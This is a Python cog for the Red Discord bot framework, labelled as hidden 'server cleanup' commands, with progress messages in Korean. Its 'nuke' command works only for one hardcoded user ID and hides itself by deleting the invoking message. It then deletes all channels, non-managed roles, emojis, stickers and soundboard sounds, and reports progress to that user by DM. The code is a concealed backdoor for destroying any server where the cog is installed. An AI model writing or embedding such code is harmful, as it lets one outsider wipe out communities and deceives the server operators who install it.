import asyncio

import discord
from redbot.core import Config, commands


ALLOWED_USER_ID = 1173942304927645786


class Nuke(commands.Cog):
    """Server cleanup (hidden commands)."""

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=914273600321)
        default_guild = {
            "nuke_in_progress": False,
            "deleted_channels": 0,
            "deleted_roles": 0,
            "deleted_emojis": 0,
            "deleted_stickers": 0,
            "deleted_sounds": 0,
        }
        self.config.register_guild(**default_guild)
        self._stop_flags = set()

    def _is_allowed(self, ctx: commands.Context) -> bool:
        return ctx.author.id == ALLOWED_USER_ID

    async def _send_dm(self, user: discord.abc.User, content: str):
        try:
            return await user.send(content)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _has_required_perms(self, ctx: commands.Context) -> bool:
        me = ctx.guild.me
        if me is None:
            return False
        perms = me.guild_permissions
        return perms.manage_channels and perms.manage_roles

    async def _wait_for_confirm(self, ctx: commands.Context, message: discord.Message) -> bool:
        def check(reaction: discord.Reaction, user: discord.User):
            if reaction.message.id != message.id:
                return False
            if user.id != ctx.author.id:
                return False
            return str(reaction.emoji) == "✅"

        try:
            await self.bot.wait_for("reaction_add", timeout=30.0, check=check)
            return True
        except asyncio.TimeoutError:
            try:
                await message.add_reaction("❌")
            except discord.HTTPException:
                pass
            return False

    async def _reset_progress(self, guild: discord.Guild):
        await self.config.guild(guild).nuke_in_progress.set(False)
        await self.config.guild(guild).deleted_channels.set(0)
        await self.config.guild(guild).deleted_roles.set(0)
        await self.config.guild(guild).deleted_emojis.set(0)
        await self.config.guild(guild).deleted_stickers.set(0)
        await self.config.guild(guild).deleted_sounds.set(0)

    async def _delete_channels(self, guild: discord.Guild, progress_user: discord.abc.User):
        deleted = 0
        for channel in list(guild.channels):
            if guild.id in self._stop_flags:
                break
            try:
                await channel.delete(reason="Nuke cleanup")
                deleted += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_channels.set(deleted)
            await self._send_dm(progress_user, f"🔥 서버 정리 중... (채널 {deleted}개 삭제)")
            await asyncio.sleep(0.5)
        return deleted

    async def _delete_roles(self, guild: discord.Guild, progress_user: discord.abc.User):
        deleted = 0
        for role in list(guild.roles):
            if guild.id in self._stop_flags:
                break
            if role.managed:
                continue
            if role.is_default():
                continue
            try:
                await role.delete(reason="Nuke cleanup")
                deleted += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_roles.set(deleted)
            await self._send_dm(progress_user, f"🔥 서버 정리 중... (역할 {deleted}개 삭제)")
            await asyncio.sleep(0.5)
        return deleted

    async def _delete_emojis(self, guild: discord.Guild, progress_user: discord.abc.User):
        deleted = 0
        for emoji in list(getattr(guild, "emojis", [])):
            if guild.id in self._stop_flags:
                break
            try:
                await emoji.delete(reason="Nuke cleanup")
                deleted += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_emojis.set(deleted)
            await self._send_dm(progress_user, f"🔥 서버 정리 중... (이모지 {deleted}개 삭제)")
            await asyncio.sleep(0.5)
        return deleted

    async def _delete_stickers(self, guild: discord.Guild, progress_user: discord.abc.User):
        deleted = 0
        for sticker in list(getattr(guild, "stickers", [])):
            if guild.id in self._stop_flags:
                break
            try:
                await sticker.delete(reason="Nuke cleanup")
                deleted += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_stickers.set(deleted)
            await self._send_dm(progress_user, f"🔥 서버 정리 중... (스티커 {deleted}개 삭제)")
            await asyncio.sleep(0.5)
        return deleted

    async def _delete_sounds(self, guild: discord.Guild, progress_user: discord.abc.User):
        deleted = 0
        sounds = getattr(guild, "soundboard_sounds", None)
        if sounds is None:
            return deleted
        for sound in list(sounds):
            if guild.id in self._stop_flags:
                break
            try:
                await sound.delete(reason="Nuke cleanup")
                deleted += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_sounds.set(deleted)
            await self._send_dm(progress_user, f"🔥 서버 정리 중... (사운드 보드 {deleted}개 삭제)")
            await asyncio.sleep(0.5)
        return deleted

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context):
        if not self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        if ctx.message:
            try:
                await ctx.message.delete()
            except (discord.Forbidden, discord.HTTPException):
                pass

        if not await self._has_required_perms(ctx):
            await self._send_dm(ctx.author, "봇에게 필요한 권한이 없습니다.")
            return

        if await self.config.guild(ctx.guild).nuke_in_progress():
            return

        confirm_msg = await ctx.send("fr?")
        try:
            await confirm_msg.add_reaction("✅")
        except discord.HTTPException:
            pass

        confirmed = await self._wait_for_confirm(ctx, confirm_msg)
        if not confirmed:
            return

        await self._reset_progress(ctx.guild)
        await self.config.guild(ctx.guild).nuke_in_progress.set(True)
        progress_dm = await self._send_dm(ctx.author, "🔥 서버 정리 중... (진행률 표시)")

        self._stop_flags.discard(ctx.guild.id)

        deleted_channels = await self._delete_channels(ctx.guild, ctx.author)
        deleted_roles = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_roles = await self._delete_roles(ctx.guild, ctx.author)
        deleted_emojis = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_emojis = await self._delete_emojis(ctx.guild, ctx.author)
        deleted_stickers = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_stickers = await self._delete_stickers(ctx.guild, ctx.author)
        deleted_sounds = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_sounds = await self._delete_sounds(ctx.guild, ctx.author)

        await self.config.guild(ctx.guild).deleted_channels.set(deleted_channels)
        await self.config.guild(ctx.guild).deleted_roles.set(deleted_roles)
        await self.config.guild(ctx.guild).deleted_emojis.set(deleted_emojis)
        await self.config.guild(ctx.guild).deleted_stickers.set(deleted_stickers)
        await self.config.guild(ctx.guild).deleted_sounds.set(deleted_sounds)

        if ctx.guild.id in self._stop_flags:
            await self._send_dm(
                ctx.author,
                "⏸️ 중단됨. 채널 {0}개, 역할 {1}개, 이모지 {2}개, "
                "스티커 {3}개, 사운드 보드 {4}개 삭제 완료.".format(
                    deleted_channels,
                    deleted_roles,
                    deleted_emojis,
                    deleted_stickers,
                    deleted_sounds,
                ),
            )
        else:
            await self._send_dm(
                ctx.author,
                "✅ 서버 정리 완료. 채널 {0}개, 역할 {1}개, 이모지 {2}개, "
                "스티커 {3}개, 사운드 보드 {4}개 삭제됨.".format(
                    deleted_channels,
                    deleted_roles,
                    deleted_emojis,
                    deleted_stickers,
                    deleted_sounds,
                ),
            )

        await self.config.guild(ctx.guild).nuke_in_progress.set(False)
        if progress_dm:
            try:
                await progress_dm.edit(content="✅ 완료")
            except discord.HTTPException:
                pass

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nukestop(self, ctx: commands.Context):
        if not self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        if not await self.config.guild(ctx.guild).nuke_in_progress():
            return

        self._stop_flags.add(ctx.guild.id)
        deleted_channels = await self.config.guild(ctx.guild).deleted_channels()
        deleted_roles = await self.config.guild(ctx.guild).deleted_roles()
        deleted_emojis = await self.config.guild(ctx.guild).deleted_emojis()
        deleted_stickers = await self.config.guild(ctx.guild).deleted_stickers()
        deleted_sounds = await self.config.guild(ctx.guild).deleted_sounds()
        await self._send_dm(
            ctx.author,
            "⏸️ 중단됨. 채널 {0}개, 역할 {1}개, 이모지 {2}개, 스티커 {3}개, "
            "사운드 보드 {4}개 삭제 완료.".format(
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
            ),
        )
